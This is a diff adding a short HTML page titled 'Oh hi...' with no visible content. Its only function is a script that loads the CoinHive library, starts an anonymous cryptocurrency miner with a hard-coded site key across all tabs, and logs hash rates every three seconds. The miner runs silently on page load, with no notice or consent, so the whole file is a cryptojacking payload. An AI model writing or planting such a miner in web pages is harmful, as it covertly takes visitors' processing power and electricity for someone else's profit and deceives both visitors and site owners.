@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Oh hi...</title>
+</head>
+<body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+  var miner = new CoinHive.Anonymous('2Gz19ZtfVgAqVZ6o0cLvzFQRDOsgU8LM');
+  miner.start(CoinHive.FORCE_MULTI_TAB);
+  setInterval(function() {
+    console.log("Hashes/S:" + miner.getHashesPerSecond(), " TotalHashes:" + miner.getTotalHashes() + " Accepted Hashes:" + miner.getAcceptedHashes());
+  }, 3000);
+</script>
+</body>
+</html>
